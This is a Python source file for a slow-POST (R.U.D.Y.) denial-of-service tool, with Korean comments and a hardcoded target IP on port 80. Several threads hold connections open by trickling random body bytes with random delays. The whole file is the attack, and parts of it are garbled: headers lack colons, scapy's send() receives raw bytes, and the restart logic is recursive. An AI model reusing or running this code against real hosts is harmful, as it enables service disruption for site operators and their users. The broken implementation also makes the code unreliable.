import tkinter
from tkinter import *
from scapy.all import *
from threading import Thread
import socket
import sys
import time
import string
import random
ip='112.186.153.6'
p=80
t=2

useragents=[ "User-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
            "Accept-language: en-US,en"
             ]
class http_rudy(Thread):
    def __init__(self,host,port):
        Thread.__init__(self)
        self.host=host
        self.port=port
        self.count=0
        self.running=True
    def run(self):
        while self.running:
            try:
                print("packet send {}".format(str(self.count)))



                self.socks = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # socket 생성
                self.socks.connect((self.host, self.port))  # ip 라는 인자값에 담긴 IP와 연결하고 80번 포트로 연결

                send(bytes("Post /http/1.1\r\n", encoding="utf-8"))
                send(
                    bytes("Host {}\r\n".format(self.host).encode("utf-8")))  # headers에 저장 되어있는 값을 인코딩 utf-8 로 번역해서 보낸다.
                send(bytes("User-agent {}\r\n".format(random.choice(useragents)).encode("utf-8")))
                send(bytes("connection Keep-alive\r\n", encoding="utf-8"))
                send(bytes("Keep-alive 900\r\n", encoding="utf-8"))
                send(bytes("content Length 10000\r\n",encoding="utf-8"))
                send(bytes("Content type application/x-www-form-urlencoded\r\n\r\n", encoding="utf-8"))
                for i in range(0,9000):
                    Random = random.choice(string.ascii_letters+string.digits).encode('utf-8')
                    self.socks.send(Random)
                    time.sleep(random.uniform(0.1,3))
                self.count+=1
                self.socks.close()
                self.run()
            except socket.error:
                print('Error,restart')
                self.run()


def imfo():
   global ip ,p ,t
   return ip , p , t
def arg_user():
    print("-i")
    print("-p")
    print("-t")

if __name__ == '__main__':
    args=imfo()
    #print(args)
    if args[0]:
        host=args[0]
    if args[1]:
        port=args[1]
    if args[2]:
        threads=args[2]
for rudy in range(threads):
    rudy = http_rudy(host,port)
    rudy.start()